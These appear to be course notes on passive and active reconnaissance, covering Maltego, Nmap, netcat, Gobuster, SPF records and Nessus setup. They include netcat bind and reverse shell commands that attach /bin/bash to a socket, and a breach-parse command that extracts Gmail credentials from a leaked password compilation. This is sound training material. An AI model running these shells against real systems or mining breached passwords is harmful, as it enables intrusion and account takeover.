# Agenda

- Passive Reconnaissance
- Passive vs. Active Reconnaissance
- Main Tools and Techniques

## Exercise (Maltego)
- Register on Maltego.
- Activate "Run All" for "ALL TRANSFORMS."
- Choose a company from the top 50 and run Maltego on its domain.
- Choose a public figure and run Maltego.

## Passive Reconnaissance
A database containing more than 1.4 billion passwords in clear text, including many from Portuguese users, can be found here:
[GitHub - tensorflow-1.4-billion-password-analysis](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)

This GitHub repository provides a script to help analyze the database:
[GitHub - breach-parse](https://github.com/hmaverickadams/breach-parse)

Example usage for emails with @gmail.com:
```
breach-parse @gmail.com gmail.txt "./BreachCompilation/data"
```

### Data Leaks
- [Have I Been Pwned](https://haveibeenpwned.com/)
- [Dehashed](https://www.dehashed.com)

## Passive vs. Active Reconnaissance

| Aspect | Passive Reconnaissance | Active Reconnaissance |
|--------|------------------------|-----------------------|
| Interaction with target | None | Direct contact with the target |
| Detection Risk | Low | High |
| Examples | Google search, DNS, WHOIS, etc. | Ping, Port Scanning, etc. |
| Is it legal? | Yes | Maybe (depends on authorization) |

## Active Reconnaissance

### Tools
- **Nmap**: Scans IPs and ports, identifies services, versions, OS, etc.
- **Fping**: Multiple ping scanning for quick network discovery.
- **Recon-ng**: Excellent host discovery.
- **Whatweb**: Identifies website technologies (e.g., WordPress).
- **Netcat**: Direct communication with open ports.
- **Gobuster**: Searches for hidden directories and subdomains.
- **Nessus**: Powerful vulnerability scanning and security analysis tool.

### Nmap
Installation:
```
sudo apt install nmap
```
Scan the most common 1000 ports:
```
nmap -v -oG - | grep "Ports scanned"
```
Scan all 65535 ports and detect service versions:
```
nmap –sV -p- 10.0.2.7
```
Scan for vulnerabilities:
```
nmap --script vuln scanme.nmap.org
```
Detect OS:
```
nmap -O 10.0.2.7
```

### Fping
Scan for active hosts in a network:
```
fping -a -g 10.0.2.0/24
```

### Recon-ng
```
recon-ng
marketplace install hackertarget
modules load hackertarget
options set SOURCE example.com
run
show hosts
```

### Whatweb
```
whatweb example.com
```

### Netcat
Open a port for listening:
```
nc -l -p 12345
```
Connect to a listening host:
```
nc 10.0.2.4 12345
```
Backup over the network:
```
nc -l -p 12345 > backup.tar.gz
tar -czf - ./novapasta | nc 10.0.2.5 12345
```

### Netcat - Bind Shell
Victim opens a communication port:
```
nc -lvp 12345 -e /bin/bash
```
Attacker connects:
```
nc 10.0.2.4 12345
```

### Netcat - Reverse Shell
Attacker listens for a connection:
```
nc -lvp 12345
```
Victim connects to the attacker’s shell:
```
nc 10.0.2.15 12345 -e /bin/bash
```

### Gobuster
Find available web directories:
```
gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

## DNS Records

### SPF Records Example
```
v=spf1 ip4:213.14.2.0/24 include:example.com –all
```
**SPF Components:**
- **v=spf1**: Defines SPF version.
- **ip4 or ip6**: Specifies allowed IPs.
- **include**: Allows SPF records from another domain.
- **-all, ~all, +all**:
  - `-all`: Reject unauthorized servers.
  - `~all`: Accept but mark as suspicious.
  - `+all`: Accept from any server (not recommended).

## Installing Nessus
[Download Nessus](https://www.tenable.com/downloads/nessus)
```
wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/24321/download?i_agree_to_tenable_license_agreement=true
mv 'download?i_agree_to_tenable_license_agreement=true' Nessus-10.5.2-debian10_amd64.deb
sudo dpkg -i Nessus-10.5.2-debian10_amd64.deb
```
Start Nessus:
```
sudo systemctl start nessusd
```
Open in browser:
```
https://127.0.0.1:8834
```
Register as **Nessus Essentials**.

## Nessus Scanning
Perform two **Basic Network Scans**:
- `scanme.nmap.org`
- `10.0.2.4` (validate a local network IP)